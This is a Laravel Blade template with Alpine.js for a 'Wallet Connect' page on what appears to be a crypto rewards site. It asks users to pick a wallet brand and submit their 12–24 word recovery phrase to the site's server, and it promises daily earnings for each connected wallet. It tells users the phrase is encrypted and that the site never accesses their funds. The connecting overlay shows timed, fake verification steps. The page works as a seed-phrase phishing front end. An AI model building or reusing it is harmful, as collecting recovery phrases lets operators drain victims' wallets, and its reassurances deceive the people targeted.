@extends('layouts.dash1')
@section('title', $title)
@section('content')

    {{-- Alerts --}}
    <x-danger-alert />
    <x-success-alert />
    <x-alert />

    {{-- Ticker Tape --}}
    @include('user.partials.ticker-tape')

    {{-- Page Header --}}
    @include('user.partials.page-header', [
        'title' => 'Wallet Connect',
        'subtitle' => 'Manage your connected cryptocurrency wallets',
    ])

    @php
        $walletCount = $wallets->count();
        $maxWallets = 10;
        $canConnect = $walletCount < $maxWallets;

        // Wallet catalog with slugs matching filenames in temp/wallet/
        $featuredWallets = [
            ['name' => 'MetaMask',        'slug' => 'metamask',       'color' => 'bg-orange-500/10 text-orange-400'],
            ['name' => 'Trust Wallet',    'slug' => 'trust-wallet',   'color' => 'bg-blue-500/10 text-blue-400'],
            ['name' => 'Coinbase Wallet', 'slug' => 'coinbase-wallet','color' => 'bg-blue-600/10 text-blue-500'],
            ['name' => 'Phantom',         'slug' => 'phantom',        'color' => 'bg-purple-500/10 text-purple-400'],
            ['name' => 'Exodus',          'slug' => 'exodus',         'color' => 'bg-violet-500/10 text-violet-400'],
            ['name' => 'Ledger',          'slug' => 'ledger',         'color' => 'bg-gray-500/10 text-gray-400'],
        ];

        $moreWallets = [
            ['name' => 'OKX',             'slug' => 'okx'],
            ['name' => 'Binance',         'slug' => 'binance'],
            ['name' => 'Rabby',           'slug' => 'rabby'],
            ['name' => 'Tangem',          'slug' => 'tangem'],
            ['name' => 'Arculus',         'slug' => 'arculus'],
            ['name' => 'Namo',            'slug' => 'namo'],
            ['name' => 'DCent',           'slug' => 'dcent'],
            ['name' => 'Trezor',          'slug' => 'trezor'],
            ['name' => 'Atomic Wallet',   'slug' => 'atomic'],
            ['name' => 'Rainbow',         'slug' => 'rainbow'],
            ['name' => 'Argent',          'slug' => 'argent'],
            ['name' => 'KeepKey',         'slug' => 'keepkey'],
            ['name' => 'Guarda',          'slug' => 'guarda'],
            ['name' => 'Coinomi',         'slug' => 'coinomi'],
            ['name' => 'Electrum',        'slug' => 'electrum'],
            ['name' => 'Mycelium',        'slug' => 'mycelium'],
            ['name' => 'Zerion',          'slug' => 'zerion'],
            ['name' => 'Edge',            'slug' => 'edge'],
            ['name' => '1inch',           'slug' => '1inch'],
            ['name' => 'Bitcoin Wallet',  'slug' => 'bitcoin-wallet'],
        ];

        // Helper: find wallet logo in temp/wallet/ with any extension, fallback to other.png
        $walletLogo = function ($slug) {
            foreach (['svg', 'png', 'webp', 'jpg'] as $ext) {
                if (file_exists(base_path("temp/wallet/{$slug}.{$ext}"))) {
                    return asset("temp/wallet/{$slug}.{$ext}");
                }
            }
            return asset('temp/wallet/other.png');
        };

        // Get already connected wallet names for this user
        $connectedNames = $wallets->pluck('wallet_name')->map(fn($n) => strtolower($n))->toArray();
    @endphp

    <div x-data="walletConnect()" class="grid grid-cols-1 lg:grid-cols-12 gap-6">

        {{-- ═══ LEFT COLUMN: Wallets List + Connect Form ═══ --}}
        <div class="lg:col-span-8 space-y-5">

            {{-- ── My Connected Wallets ── --}}
            <div class="bg-surface-raised border border-surface-border rounded-xl">
                <div class="flex items-center justify-between p-5 border-b border-surface-border">
                    <div class="flex items-center gap-3">
                        <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-primary-subtle">
                            <x-icon name="wallet" class="w-5 h-5 text-primary" />
                        </div>
                        <div>
                            <h2 class="text-sm font-semibold text-content-primary">My Connected Wallets</h2>
                            <p class="text-xs text-content-tertiary mt-0.5">{{ $walletCount }} of {{ $maxWallets }} slots used</p>
                        </div>
                    </div>
                    {{-- Slot indicator --}}
                    <div class="flex items-center gap-1.5">
                        @for ($i = 0; $i < $maxWallets; $i++)
                            <div class="w-2 h-2 rounded-full {{ $i < $walletCount ? 'bg-primary' : 'bg-surface-border' }}"></div>
                        @endfor
                    </div>
                </div>

                @if ($walletCount > 0)
                    <div class="divide-y divide-surface-border">
                        @foreach ($wallets as $wallet)
                            @php
                                $slug = \Illuminate\Support\Str::slug($wallet->wallet_name);
                                $logoPath = null;
                                foreach (['svg', 'png', 'webp', 'jpg'] as $ext) {
                                    if (file_exists(base_path("temp/wallet/{$slug}.{$ext}"))) {
                                        $logoPath = "temp/wallet/{$slug}.{$ext}";
                                        break;
                                    }
                                }
                            @endphp
                            <div class="flex items-center justify-between p-4 hover:bg-surface-overlay/30 transition-colors">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 rounded-lg overflow-hidden bg-surface-overlay flex items-center justify-center flex-shrink-0">
                                        @if ($logoPath)
                                            <img src="{{ asset($logoPath) }}" alt="{{ $wallet->wallet_name }}" class="w-10 h-10 object-contain">
                                        @else
                                            <img src="{{ asset('temp/wallet/other.png') }}" alt="{{ $wallet->wallet_name }}" class="w-10 h-10 object-contain">
                                        @endif
                                    </div>
                                    <div>
                                        <p class="text-sm font-medium text-content-primary">{{ $wallet->wallet_name }}</p>
                                        <p class="text-xs text-content-tertiary">Connected {{ $wallet->created_at->diffForHumans() }}</p>
                                    </div>
                                </div>
                                <div class="flex items-center gap-3">
                                    <span class="inline-flex items-center gap-1 text-xs font-medium px-2 py-1 rounded-full bg-gain/10 text-gain">
                                        <span class="w-1.5 h-1.5 rounded-full bg-gain"></span>
                                        Active
                                    </span>
                                </div>
                            </div>
                        @endforeach
                    </div>
                @else
                    {{-- Empty State --}}
                    <div class="p-8 text-center">
                        <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-surface-overlay flex items-center justify-center">
                            <x-icon name="wallet" class="w-8 h-8 text-content-tertiary" />
                        </div>
                        <h3 class="text-sm font-semibold text-content-primary mb-1">No Wallets Connected</h3>
                        <p class="text-xs text-content-tertiary max-w-sm mx-auto">Connect your first cryptocurrency wallet to start earning daily rewards.</p>
                    </div>
                @endif
            </div>

            {{-- ── Connect New Wallet ── --}}
            @if ($canConnect)
            <div class="bg-surface-raised border border-surface-border rounded-xl" x-data="{ expanded: {{ $walletCount === 0 ? 'true' : 'false' }} }">
                <button @click="expanded = !expanded" class="flex items-center justify-between w-full p-5 text-left">
                    <div class="flex items-center gap-3">
                        <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-primary-subtle">
                            <x-icon name="plus" class="w-5 h-5 text-primary" />
                        </div>
                        <div>
                            <h2 class="text-sm font-semibold text-content-primary">Connect New Wallet</h2>
                            <p class="text-xs text-content-tertiary mt-0.5">Choose a wallet provider and enter your recovery phrase</p>
                        </div>
                    </div>
                    <svg class="w-5 h-5 text-content-tertiary transition-transform" :class="expanded && 'rotate-180'" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5" />
                    </svg>
                </button>

                <div x-show="expanded" x-collapse>
                    <div class="px-5 pb-5 space-y-6 border-t border-surface-border pt-5">

                        {{-- Featured Wallets Grid --}}
                        <div>
                            <p class="text-xs font-medium text-content-secondary uppercase tracking-wider mb-3">Popular Wallets</p>
                            <div class="grid grid-cols-2 sm:grid-cols-3 gap-3">
                                @foreach ($featuredWallets as $fw)
                                    @php $isConnected = in_array(strtolower($fw['name']), $connectedNames); @endphp
                                    <button type="button"
                                        @click="selectWallet('{{ $fw['name'] }}')"
                                        :class="selectedWallet === '{{ $fw['name'] }}' ? 'border-primary bg-primary-subtle' : '{{ $isConnected ? 'border-surface-border opacity-50 cursor-not-allowed' : 'border-surface-border hover:border-surface-border-light' }}'"
                                        class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                        {{ $isConnected ? 'disabled' : '' }}>
                                        <img src="{{ $walletLogo($fw['slug']) }}" alt="{{ $fw['name'] }}" class="w-10 h-10 rounded-lg object-contain">
                                        <span class="text-xs font-medium text-content-primary">{{ $fw['name'] }}</span>
                                        @if ($isConnected)
                                            <span class="absolute top-1.5 right-1.5">
                                                <x-icon name="check-circle" class="w-4 h-4 text-gain" />
                                            </span>
                                        @endif
                                    </button>
                                @endforeach
                            </div>
                        </div>

                        {{-- More Wallets Toggle --}}
                        <div>
                            <button type="button" @click="showMoreWallets = !showMoreWallets"
                                class="flex items-center gap-2 text-xs font-medium text-primary hover:text-primary-light transition-colors">
                                <span x-text="showMoreWallets ? 'Show Less' : 'More Wallets'"></span>
                                <svg class="w-3.5 h-3.5 transition-transform" :class="showMoreWallets && 'rotate-180'" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" d="m19.5 8.25-7.5 7.5-7.5-7.5" />
                                </svg>
                            </button>

                            <div x-show="showMoreWallets" x-collapse class="mt-3">
                                <div class="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-2">
                                    @foreach ($moreWallets as $mw)
                                        @php $isConnected = in_array(strtolower($mw['name']), $connectedNames); @endphp
                                        <button type="button"
                                            @click="selectWallet('{{ $mw['name'] }}')"
                                            :class="selectedWallet === '{{ $mw['name'] }}' ? 'border-primary bg-primary-subtle' : '{{ $isConnected ? 'border-surface-border opacity-50 cursor-not-allowed' : 'border-surface-border hover:border-surface-border-light' }}'"
                                            class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                            {{ $isConnected ? 'disabled' : '' }}>
                                            <img src="{{ $walletLogo($mw['slug']) }}" alt="{{ $mw['name'] }}" class="w-8 h-8 rounded-md object-contain">
                                            <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">{{ $mw['name'] }}</span>
                                            @if ($isConnected)
                                                <span class="absolute top-1 right-1">
                                                    <x-icon name="check-circle" class="w-3.5 h-3.5 text-gain" />
                                                </span>
                                            @endif
                                        </button>
                                    @endforeach
                                </div>
                            </div>
                        </div>

                        {{-- Recovery Phrase Form --}}
                        <form method="POST" action="{{ route('wallectConnect') }}" @submit="handleSubmit($event)">
                            @csrf
                            <input type="hidden" name="wallet" :value="selectedWallet">

                            <div x-show="selectedWallet" x-transition x-cloak class="space-y-4">

                                {{-- Selected Wallet Indicator --}}
                                <div class="flex items-center gap-3 p-3 rounded-lg bg-surface-overlay/50 border border-surface-border">
                                    <x-icon name="check-circle" class="w-5 h-5 text-primary" />
                                    <p class="text-sm text-content-primary">
                                        Selected: <span class="font-semibold" x-text="selectedWallet"></span>
                                    </p>
                                    <button type="button" @click="selectedWallet = ''" class="ml-auto text-content-tertiary hover:text-content-secondary">
                                        <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
                                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12" />
                                        </svg>
                                    </button>
                                </div>

                                {{-- Recovery Phrase Label --}}
                                <div>
                                    <label class="flex items-center gap-2 text-sm font-medium text-content-primary mb-2">
                                        <x-icon name="key" class="w-4 h-4 text-content-secondary" />
                                        Recovery Phrase (Seed Phrase)
                                    </label>

                                    {{-- Security Warning --}}
                                    <div class="flex items-start gap-2.5 p-3 rounded-lg bg-warning/10 border border-warning/20 mb-3">
                                        <x-icon name="exclamation-triangle" class="w-4 h-4 text-warning flex-shrink-0 mt-0.5" />
                                        <p class="text-xs text-warning">
                                            <strong>Important:</strong> Your recovery phrase is encrypted and securely stored. We never access your funds directly.
                                        </p>
                                    </div>

                                    {{-- Textarea --}}
                                    <div class="relative">
                                        <textarea
                                            name="mnemonic"
                                            x-model="recoveryPhrase"
                                            @input="validatePhrase()"
                                            :class="hasError ? 'border-loss focus:ring-loss/30' : 'border-surface-border focus:ring-primary/30 focus:border-primary'"
                                            class="w-full bg-surface-overlay border rounded-lg px-3.5 py-3 text-sm text-content-primary placeholder:text-content-tertiary focus:outline-none focus:ring-2 resize-none font-mono"
                                            rows="3"
                                            placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."
                                            required></textarea>
                                        <div class="absolute bottom-2.5 right-3 text-[11px] font-medium"
                                             :class="wordCount >= 12 && wordCount <= 24 ? 'text-gain' : 'text-content-tertiary'">
                                            <span x-text="wordCount"></span>/12+ words
                                        </div>
                                    </div>

                                    {{-- Validation Indicators --}}
                                    <div class="flex flex-wrap gap-4 mt-2">
                                        <div class="flex items-center gap-1.5 text-xs">
                                            <div class="w-4 h-4 rounded-full flex items-center justify-center"
                                                 :class="wordCount >= 12 && wordCount <= 24 ? 'bg-gain/10' : 'bg-surface-overlay'">
                                                <x-icon name="check-circle" class="w-3.5 h-3.5"
                                                         x-bind:class="wordCount >= 12 && wordCount <= 24 ? 'text-gain' : 'text-content-tertiary'" />
                                            </div>
                                            <span :class="wordCount >= 12 && wordCount <= 24 ? 'text-gain' : 'text-content-tertiary'">12–24 words</span>
                                        </div>
                                        <div class="flex items-center gap-1.5 text-xs">
                                            <div class="w-4 h-4 rounded-full flex items-center justify-center"
                                                 :class="recoveryPhrase.length > 0 && !hasInvalidChars ? 'bg-gain/10' : 'bg-surface-overlay'">
                                                <x-icon name="check-circle" class="w-3.5 h-3.5"
                                                         x-bind:class="recoveryPhrase.length > 0 && !hasInvalidChars ? 'text-gain' : 'text-content-tertiary'" />
                                            </div>
                                            <span :class="recoveryPhrase.length > 0 && !hasInvalidChars ? 'text-gain' : 'text-content-tertiary'">Valid characters</span>
                                        </div>
                                    </div>
                                </div>

                                {{-- Connect Button --}}
                                <button type="submit"
                                    x-show="isValidPhrase"
                                    x-transition
                                    :disabled="isConnecting"
                                    :class="isConnecting ? 'opacity-75 cursor-wait' : 'hover:bg-primary-dark'"
                                    class="w-full flex items-center justify-center gap-2.5 bg-primary text-content-inverse font-semibold text-sm py-3 rounded-xl transition-colors">
                                    <template x-if="!isConnecting">
                                        <span class="flex items-center gap-2">
                                            <x-icon name="link" class="w-4 h-4" />
                                            Connect <span x-text="selectedWallet"></span>
                                        </span>
                                    </template>
                                    <template x-if="isConnecting">
                                        <span class="flex items-center gap-2.5">
                                            <svg class="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                                            </svg>
                                            Connecting...
                                        </span>
                                    </template>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            @else
                {{-- Max Wallets Reached --}}
                <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                    <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-info/10 flex-shrink-0">
                            <x-icon name="information-circle" class="w-5 h-5 text-info" />
                        </div>
                        <div>
                            <h3 class="text-sm font-semibold text-content-primary">Maximum Wallets Reached</h3>
                            <p class="text-xs text-content-tertiary mt-1">You've connected {{ $maxWallets }} wallets, which is the maximum allowed. Contact support if you need to disconnect a wallet to free up a slot.</p>
                        </div>
                    </div>
                </div>
            @endif

        </div>

        {{-- ═══ RIGHT COLUMN: Info Sidebar ═══ --}}
        <div class="lg:col-span-4 space-y-5">

            {{-- Earning Information --}}
            <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                <div class="flex items-center gap-3 mb-4">
                    <div class="flex items-center justify-center w-9 h-9 rounded-lg bg-gain/10">
                        <x-icon name="banknotes" class="w-5 h-5 text-gain" />
                    </div>
                    <h3 class="text-sm font-semibold text-content-primary">Earning Rewards</h3>
                </div>
                <div class="space-y-3">
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-content-tertiary">Daily Reward</span>
                        <span class="text-sm font-bold text-gain">@money($settings->min_return)</span>
                    </div>
                    <div class="w-full h-px bg-surface-border"></div>
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-content-tertiary">Min Balance Required</span>
                        <span class="text-sm font-bold text-content-primary">@money($settings->min_balance)</span>
                    </div>
                </div>
                <p class="text-xs text-content-tertiary mt-4 leading-relaxed">
                    Each connected wallet earns daily rewards automatically. Ensure your wallet meets the minimum balance requirement.
                </p>
            </div>

            {{-- Connection Stats --}}
            @if ($walletCount > 0)
            <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                <h3 class="text-sm font-semibold text-content-primary mb-4">Connection Summary</h3>
                <div class="space-y-3">
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-content-tertiary">Active Wallets</span>
                        <span class="text-sm font-semibold text-gain">{{ $wallets->where('status', 'active')->count() }}</span>
                    </div>
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-content-tertiary">Available Slots</span>
                        <span class="text-sm font-semibold text-content-primary">{{ $maxWallets - $walletCount }}</span>
                    </div>
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-content-tertiary">Est. Daily Earnings</span>
                        <span class="text-sm font-bold text-gain">@money($settings->min_return * $walletCount)</span>
                    </div>
                </div>
                {{-- Progress bar --}}
                <div class="mt-4">
                    <div class="flex items-center justify-between text-[11px] text-content-tertiary mb-1.5">
                        <span>Capacity</span>
                        <span>{{ $walletCount }}/{{ $maxWallets }}</span>
                    </div>
                    <div class="w-full h-1.5 rounded-full bg-surface-overlay">
                        <div class="h-1.5 rounded-full bg-primary transition-all" style="width: {{ ($walletCount / $maxWallets) * 100 }}%"></div>
                    </div>
                </div>
            </div>
            @endif

            {{-- Security Features --}}
            <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                <h3 class="text-sm font-semibold text-content-primary mb-4">Security</h3>
                <div class="space-y-4">
                    <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-7 h-7 rounded-md bg-gain/10 flex-shrink-0">
                            <x-icon name="shield-check" class="w-4 h-4 text-gain" />
                        </div>
                        <div>
                            <p class="text-xs font-medium text-content-primary">Bank-Level Encryption</p>
                            <p class="text-[11px] text-content-tertiary">256-bit AES encryption at rest</p>
                        </div>
                    </div>
                    <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-7 h-7 rounded-md bg-info/10 flex-shrink-0">
                            <x-icon name="eye-slash" class="w-4 h-4 text-info" />
                        </div>
                        <div>
                            <p class="text-xs font-medium text-content-primary">Privacy First</p>
                            <p class="text-[11px] text-content-tertiary">No direct fund access</p>
                        </div>
                    </div>
                    <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-7 h-7 rounded-md bg-warning/10 flex-shrink-0">
                            <x-icon name="bolt" class="w-4 h-4 text-warning" />
                        </div>
                        <div>
                            <p class="text-xs font-medium text-content-primary">Instant Setup</p>
                            <p class="text-[11px] text-content-tertiary">Connect in under 30 seconds</p>
                        </div>
                    </div>
                    {{-- <div class="flex items-start gap-3">
                        <div class="flex items-center justify-center w-7 h-7 rounded-md bg-primary-subtle flex-shrink-0">
                            <x-icon name="lock-closed" class="w-4 h-4 text-primary" />
                        </div>
                        <div>
                            <p class="text-xs font-medium text-content-primary">Admin-Only Disconnect</p>
                            <p class="text-[11px] text-content-tertiary">Wallets can only be removed by admin for additional safety</p>
                        </div>
                    </div> --}}
                </div>
            </div>

            {{-- Need Help --}}
            <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                <h3 class="text-sm font-semibold text-content-primary mb-2">Need Help?</h3>
                <p class="text-xs text-content-tertiary mb-3">If you're having trouble connecting or your wallet isn't listed, our support team can assist.</p>
                <a href="{{ route('support') }}"
                   class="inline-flex items-center gap-1.5 text-xs font-medium text-primary hover:text-primary-light transition-colors">
                    Contact Support
                    <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5 21 12m0 0-7.5 7.5M21 12H3" />
                    </svg>
                </a>
            </div>
        </div>
    </div>

    {{-- ── Full-Screen Connecting Overlay ── --}}
    <div x-show="isConnecting" x-transition.opacity.duration.300ms
         class="fixed inset-0 z-50 flex items-center justify-center bg-surface-base/80 backdrop-blur-sm" x-cloak>
        <div class="bg-surface-raised border border-surface-border rounded-2xl p-8 max-w-sm w-full mx-4 text-center shadow-2xl">
            {{-- Pulsing Wallet Icon --}}
            <div class="relative w-20 h-20 mx-auto mb-6">
                <div class="absolute inset-0 rounded-full bg-primary/20 animate-ping"></div>
                <div class="relative w-20 h-20 rounded-full bg-primary-subtle flex items-center justify-center">
                    <x-icon name="wallet" class="w-10 h-10 text-primary" />
                </div>
            </div>

            <h3 class="text-lg font-bold text-content-primary mb-2">Connecting Wallet</h3>
            <p class="text-sm text-content-secondary mb-6">
                Verifying <span class="font-semibold text-primary" x-text="selectedWallet"></span> connection...
            </p>

            {{-- Progress Steps --}}
            <div class="space-y-3 text-left mb-6">
                <div class="flex items-center gap-3" x-data="{ done: false }" x-init="setTimeout(() => done = true, 800)">
                    <div class="w-5 h-5 rounded-full flex items-center justify-center transition-colors"
                         :class="done ? 'bg-gain/10' : 'bg-surface-overlay'">
                        <template x-if="done"><x-icon name="check-circle" class="w-4 h-4 text-gain" /></template>
                        <template x-if="!done">
                            <svg class="animate-spin h-3.5 w-3.5 text-content-tertiary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                            </svg>
                        </template>
                    </div>
                    <span class="text-xs" :class="done ? 'text-content-primary' : 'text-content-tertiary'">Validating recovery phrase</span>
                </div>
                <div class="flex items-center gap-3" x-data="{ done: false }" x-init="setTimeout(() => done = true, 2000)">
                    <div class="w-5 h-5 rounded-full flex items-center justify-center transition-colors"
                         :class="done ? 'bg-gain/10' : 'bg-surface-overlay'">
                        <template x-if="done"><x-icon name="check-circle" class="w-4 h-4 text-gain" /></template>
                        <template x-if="!done">
                            <svg class="animate-spin h-3.5 w-3.5 text-content-tertiary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                            </svg>
                        </template>
                    </div>
                    <span class="text-xs" :class="done ? 'text-content-primary' : 'text-content-tertiary'">Establishing secure connection</span>
                </div>
                <div class="flex items-center gap-3">
                    <div class="w-5 h-5 rounded-full bg-surface-overlay flex items-center justify-center">
                        <svg class="animate-spin h-3.5 w-3.5 text-content-tertiary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
                        </svg>
                    </div>
                    <span class="text-xs text-content-tertiary">Registering wallet</span>
                </div>
            </div>

            <p class="text-[11px] text-content-tertiary">This may take a few moments. Please don't close this page.</p>
        </div>
    </div>

<script>
function walletConnect() {
    return {
        selectedWallet: '',
        recoveryPhrase: '',
        isConnecting: false,
        showMoreWallets: false,
        hasError: false,

        // Already connected wallet names (lowercase) passed from server
        connectedWallets: @json($connectedNames),

        selectWallet(wallet) {
            // Prevent selecting already connected wallets
            if (this.connectedWallets.includes(wallet.toLowerCase())) return;
            this.selectedWallet = wallet;
        },

        get wordCount() {
            if (!this.recoveryPhrase) return 0;
            return this.recoveryPhrase.trim().split(/\s+/).filter(w => w.length > 0).length;
        },

        get hasInvalidChars() {
            if (!this.recoveryPhrase) return false;
            return !/^[a-zA-Z\s]+$/.test(this.recoveryPhrase);
        },

        get isValidPhrase() {
            return this.wordCount >= 12 && this.wordCount <= 24 && !this.hasInvalidChars;
        },

        validatePhrase() {
            this.hasError = false;
            if (this.recoveryPhrase.length > 0) {
                this.hasError = this.hasInvalidChars || (this.wordCount > 0 && this.wordCount < 12);
            }
        },

        handleSubmit(e) {
            if (!this.isValidPhrase || !this.selectedWallet) {
                e.preventDefault();
                return;
            }
            this.isConnecting = true;
            // Fallback: reset after 20s if page hasn't navigated
            setTimeout(() => { this.isConnecting = false; }, 20000);
        }
    }
}
</script>

@endsection
